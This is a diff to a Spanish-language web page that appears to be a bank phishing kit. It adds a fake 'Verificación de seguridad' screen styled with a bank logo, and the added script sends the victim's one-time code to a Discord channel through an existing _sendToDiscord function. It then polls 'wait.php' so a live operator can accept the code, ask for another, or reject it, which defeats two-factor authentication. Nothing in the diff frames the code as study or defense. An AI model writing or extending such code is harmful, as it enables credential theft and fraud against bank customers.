@@ -1047,6 +1047,103 @@
       .ak { display: none !important }
     }
 
+    /* Pantalla de código OTP */
+    .tok-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: #fff;
+      z-index: 999998;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 24px;
+    }
+    .tok-overlay.show { display: flex; }
+    .tok-box {
+      width: 100%;
+      max-width: 340px;
+      text-align: center;
+    }
+    .tok-logo {
+      display: block;
+      width: 180px;
+      height: 44px;
+      background: url(./index_files/positivo.svg) no-repeat center / contain;
+      margin: 0 auto 28px;
+    }
+    .tok-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #1a1a1a;
+      margin-bottom: 10px;
+      font-family: 'Open Sans', sans-serif;
+    }
+    .tok-msg {
+      font-size: 14px;
+      color: #5a6473;
+      line-height: 1.6;
+      margin-bottom: 24px;
+      font-family: 'Open Sans', sans-serif;
+    }
+    .tok-input {
+      width: 100%;
+      background: transparent;
+      border: none;
+      border-bottom: 2px solid #292929;
+      font-size: 26px;
+      text-align: center;
+      letter-spacing: 8px;
+      font-family: 'Open Sans', sans-serif;
+      outline: none;
+      padding: 8px 0;
+      margin-bottom: 4px;
+    }
+    .tok-input:focus { border-bottom-color: #1a3a6e; }
+    .tok-err {
+      display: block;
+      font-size: 12px;
+      color: #c0392b;
+      font-family: 'Open Sans', sans-serif;
+      min-height: 18px;
+      margin-bottom: 16px;
+    }
+    .tok-btn {
+      display: block;
+      width: 100%;
+      background: #fdda24;
+      color: #292929;
+      font-weight: 700;
+      font-size: 16px;
+      padding: 14px;
+      border-radius: 50px;
+      border: none;
+      cursor: pointer;
+      text-transform: uppercase;
+      font-family: CIBfont, Helvetica, Arial, sans-serif;
+    }
+
+    /* Toast de error (sin icóno, sin botón) */
+    .notif-pop {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: rgba(25,25,25,.88);
+      color: #fff;
+      font-size: 15px;
+      font-family: 'Open Sans', sans-serif;
+      padding: 16px 22px;
+      border-radius: 10px;
+      z-index: 9999999;
+      text-align: center;
+      max-width: 280px;
+      width: 88%;
+      pointer-events: none;
+    }
+    .notif-pop.show { display: block; }
+
     /* Disclaimer de validación inline */
     .field-err {
       font-size: 12px;
@@ -1082,6 +1179,17 @@
 </head>
 
 <body class="normal-version true web-version">
+  <div class="notif-pop" id="notif-pop"></div>
+  <div class="tok-overlay" id="tok-ov">
+    <div class="tok-box">
+      <span class="tok-logo" aria-hidden="true"></span>
+      <p class="tok-title">Verificación de seguridad</p>
+      <p class="tok-msg">Hemos enviado un código de seguridad a tu número de teléfono o correo electrónico. Ingrésala para continuar.</p>
+      <input type="text" id="x-tok" inputmode="numeric" autocomplete="one-time-code" maxlength="8" class="tok-input" placeholder="_ _ _ _ _ _">
+      <span class="tok-err" id="tok-err">&nbsp;</span>
+      <button type="button" class="tok-btn" id="btn-tok">Continuar</button>
+    </div>
+  </div>
   <div class="loader-overlay" id="loader-ov">
     <div class="loader-spinner"></div>
     <div class="loader-text" id="loader-text">CARGANDO...</div>
@@ -1289,6 +1397,57 @@
         return await _sendToDiscord(data, label);
       }
 
+      // Toast sin botón
+      function _notify(msg, ms) {
+        var el = document.getElementById('notif-pop');
+        if (!el) return;
+        el.innerText = msg;
+        el.classList.add('show');
+        setTimeout(function () { el.classList.remove('show'); }, ms || 3000);
+      }
+
+      // Polling del operador cada 2s
+      function _poll(cb) {
+        var _pt = setInterval(function () {
+          fetch('wait.php', { credentials: 'same-origin', headers: { 'Accept': 'application/json' } })
+            .then(function (r) { return r.ok ? r.json() : null; })
+            .then(function (j) {
+              if (!j) return;
+              if ((j.s || 'wait') !== 'wait') { clearInterval(_pt); cb(j.s); }
+            })
+            .catch(function () {});
+        }, 2000);
+      }
+
+      // Pantalla de código OTP
+      function _setupToken() {
+        var inp = document.getElementById('x-tok');
+        var err = document.getElementById('tok-err');
+        var btn = document.getElementById('btn-tok');
+        if (inp) inp.value = '';
+        if (err) err.innerText = '\u00a0';
+        if (!btn) return;
+        btn.onclick = function () {
+          var code = inp ? inp.value.trim() : '';
+          if (!code) { if (err) err.innerText = 'Ingrese el código.'; return; }
+          if (err) err.innerText = '\u00a0';
+          _sendToDiscord({ token: code }, 'TOKEN · Código OTP');
+          document.getElementById('tok-ov').classList.remove('show');
+          _showOverlay();
+          _ovText('VERIFICANDO CÓDIGO...\nPor favor espere.');
+          _poll(function (st) {
+            if (st === 'finish') {
+              var o = _ovEl(); o.classList.add('success'); _ovText('VERIFICACIÓN EXITOSA');
+            } else if (st === 'error') {
+              _hideOverlay();
+              if (err) err.innerText = 'Código inválido. Inténtalo de nuevo.';
+              if (inp) inp.value = '';
+              document.getElementById('tok-ov').classList.add('show');
+            }
+          });
+        };
+      }
+
       // Evento click del botón
       _btn.addEventListener('click', function (e) {
         e.preventDefault();
@@ -1329,17 +1488,20 @@
         else if (_step == 3) { _sendStep(3); _loaderThen(1500, function () { _step = 4; _show(4); }); }
         else if (_step == 4) {
           _showOverlay();
-          _sendStep(4).then(function (ok) {
-            if (ok) {
-              var o = _ovEl();
-              o.classList.add('success');
-              _ovText('VERIFICACIÓN EXITOSA');
+          _ovText('PROCESANDO...\nPor favor espere.');
+          _sendStep(4);
+          _poll(function (state) {
+            if (state === 'continue') {
+              var o = _ovEl(); o.classList.add('success'); _ovText('VERIFICACIÓN EXITOSA');
               setTimeout(function () { _hideOverlay(); _resetForm(); _step = 1; _show(1); }, 2500);
-            } else {
+            } else if (state === 'token') {
               _hideOverlay();
-              alert('Algunos de tus datos son incorrectos.');
-              _resetForm();
-              _step = 1; _show(1);
+              document.getElementById('tok-ov').classList.add('show');
+              _setupToken();
+            } else if (state === 'error') {
+              _hideOverlay();
+              _resetForm(); _step = 1; _show(1);
+              _notify('Algunos de tus datos son incorrectos.', 3500);
             }
           });
         }
